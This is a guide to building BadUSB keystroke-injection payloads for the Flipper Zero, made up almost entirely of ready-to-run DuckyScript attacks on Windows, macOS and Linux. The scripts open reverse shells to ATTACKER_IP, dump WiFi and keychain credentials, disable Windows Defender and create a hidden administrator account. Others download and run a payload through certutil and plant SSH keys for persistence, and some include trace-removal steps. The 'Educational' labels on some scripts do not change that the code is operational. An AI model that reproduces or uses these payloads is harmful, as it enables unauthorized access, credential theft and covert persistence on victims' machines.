# BadUSB Scripts - Payload Creation Guide

Complete guide to writing, structuring, and optimizing BadUSB scripts (DuckyScript) for the Flipper Zero, with advanced techniques for each operating system and real-world usage scenarios.

---

## Payload Structure

Every BadUSB script is a `.txt` file saved in `/ext/badusb/` on the Flipper's SD card. The format is DuckyScript 1.0 with Flipper extensions.

### Base Template

```
REM ===================================
REM Name: [Payload Name]
REM Target OS: [Windows/macOS/Linux]
REM Layout: [IT/US/UK/DE]
REM Version: [1.0]
REM Description: [What the payload does]
REM ===================================

REM Timing configuration
DEFAULT_DELAY 100

REM === PHASE 1: Terminal Opening ===
[commands to open terminal/powershell]

REM === PHASE 2: Execution ===
[main payload]

REM === PHASE 3: Cleanup ===
[close windows, delete traces]
```

### Writing Best Practices

**Strategic delays:**
- After `GUI r` (Run dialog): 500-1000ms
- After `ENTER` on a command: 200-500ms
- After `CTRL-SHIFT ENTER` (UAC): 1500-2000ms
- After `ALT y` (UAC confirmation): 500ms
- After terminal opening: 500-1000ms
- On slow machines/VMs: double all delays

**Error handling:**
- Don't trust that the previous command succeeded
- Add generous delays before dependent commands
- Use `WAIT_FOR_BUTTON_PRESS` before the critical part if you have time

**Keyboard layout:**
- ALWAYS test with the same layout as the target
- For problematic characters use `ALTCHAR` (Alt code)
- Critical characters IT vs US: @ (AltGr+Q vs Shift+2), # (AltGr+a vs Shift+3), \ (different position)

---

## Windows Payloads

### PowerShell Reverse Shell (Educational)

```
REM Reverse Shell PS - Educational PoC
REM Target: Windows 10/11
REM Layout: IT
DEFAULT_DELAY 150

GUI r
DELAY 700
STRING powershell -w hidden -ep bypass
ENTER
DELAY 1200

STRING $c=New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()
ENTER
```

### WiFi Credential Exfiltration

```
REM WiFi Cred Exfil - Educational
REM Target: Windows 10/11 IT
DEFAULT_DELAY 100

GUI r
DELAY 700
STRING cmd /k
ENTER
DELAY 800

STRING for /f "tokens=2 delims=:" %a in ('netsh wlan show profiles ^| findstr "Profilo"') do @(for /f "tokens=2 delims=:" %b in ('netsh wlan show profile name^="%a" key^=clear ^| findstr "Contenuto"') do @echo %a:%b) >> %TEMP%\w.log
ENTER
DELAY 3000

STRING type %TEMP%\w.log
ENTER
DELAY 500

REM Cleanup
STRING del %TEMP%\w.log && exit
ENTER
```

### Defender Disabling (requires Admin)

```
REM Disable Defender - Admin Required
DEFAULT_DELAY 150

GUI
DELAY 500
STRING powershell
DELAY 300
CTRL-SHIFT ENTER
DELAY 2000
ALT y
DELAY 800

STRING Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true -DisableBehaviorMonitoring $true
ENTER
DELAY 500
STRING exit
ENTER
```

### Hidden Admin User Creation

```
REM Hidden Admin User - Educational
DEFAULT_DELAY 150

GUI r
DELAY 700
STRING cmd
DELAY 200
CTRL-SHIFT ENTER
DELAY 2000
ALT y
DELAY 800

STRING net user support_svc P@ssw0rd! /add
ENTER
DELAY 500
STRING net localgroup administrators support_svc /add
ENTER
DELAY 500
STRING reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v support_svc /t REG_DWORD /d 0 /f
ENTER
DELAY 300
STRING exit
ENTER
```

### Download & Execute via Certutil (LOLBin)

```
REM Download via certutil - LOLBin
DEFAULT_DELAY 100

GUI r
DELAY 700
STRING cmd /c certutil -urlcache -split -f http://ATTACKER/payload.exe %TEMP%\svc.exe && start %TEMP%\svc.exe
ENTER
```

---

## macOS Payloads

### Bash Reverse Shell

```
REM macOS Reverse Shell - Educational
DEFAULT_DELAY 150

GUI SPACE
DELAY 500
STRING terminal
ENTER
DELAY 1000

STRING bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &
ENTER
DELAY 300
STRING exit
ENTER
```

### Keychain Exfiltration (requires user password)

```
REM macOS Keychain Dump - Requires Password
DEFAULT_DELAY 150

GUI SPACE
DELAY 500
STRING terminal
ENTER
DELAY 1000

STRING security dump-keychain -d login.keychain 2>/dev/null | grep -A3 "class: genp" > /tmp/kc.log
ENTER
DELAY 2000
STRING cat /tmp/kc.log
ENTER
```

---

## Linux Payloads

### Python Reverse Shell

```
REM Linux Reverse Shell Python - Educational
DEFAULT_DELAY 100

CTRL-ALT t
DELAY 800

STRING python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")' &
ENTER
DELAY 300
STRING exit
ENTER
```

### SSH Key Injection (Persistence)

```
REM SSH Key Inject - Persistence
DEFAULT_DELAY 100

CTRL-ALT t
DELAY 800

STRING mkdir -p ~/.ssh && echo "ssh-rsa AAAA...YOUR_PUBLIC_KEY... pentest@target" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys
ENTER
DELAY 300
STRING exit
ENTER
```

---

## Advanced Techniques

### ALTSTRING for Layout Independence

The `ALTSTRING` command types characters using Alt codes (numpad), completely bypassing the keyboard layout. Essential when you don't know the target's layout:

```
REM Use ALTSTRING for @ regardless of layout
ALTSTRING powershell
```

### WAIT_FOR_BUTTON_PRESS for Manual Timing

```
REM Wait for the right moment
STRING Script ready. Press the button when the PC is unlocked.
WAIT_FOR_BUTTON_PRESS
REM The actual payload starts here
GUI r
...
```

### BadUSB + Mass Storage Combination

Two-phase technique:
1. The Flipper copies a file from its SD card to the PC via Mass Storage
2. BadUSB executes the copied file

Advantages: the payload can be a complex executable that cannot be "typed."

> **Personal note:** The BadUSB + Mass Storage combination is the most powerful. BadUSB types a command to copy the file from the Flipper (recognized as a USB drive) and execute it. Two USB modes in sequence that require manual switching, but the result is much more flexible than HID alone.
